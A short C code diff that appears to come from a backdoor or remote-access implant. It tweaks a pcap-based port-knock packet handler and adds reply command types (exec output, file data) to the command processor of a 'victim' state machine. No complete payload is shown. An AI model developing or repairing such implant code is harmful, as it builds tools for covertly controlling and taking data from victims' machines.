@@ -559,7 +559,7 @@ static void pcap_knock_handler(u_char *args, const struct pcap_pkthdr *header, c
         memcpy(&udp_len, udp_hdr + 4, 2);
         udp_len = ntohs(udp_len);
 
-        if (udp_len < 9) {
+        if (udp_len < 8) {
             return;
         }
 
@@ -1110,6 +1110,10 @@ static int process_command(victim_state_t *state, const struct sockaddr_in *peer
             break;
 
         case CMD_ACK:
+        case CMD_EXEC_OUTPUT:
+        case CMD_FILE_DATA:
+        case CMD_OK:
+        case CMD_ERROR:
             result = 0;
             break;
 
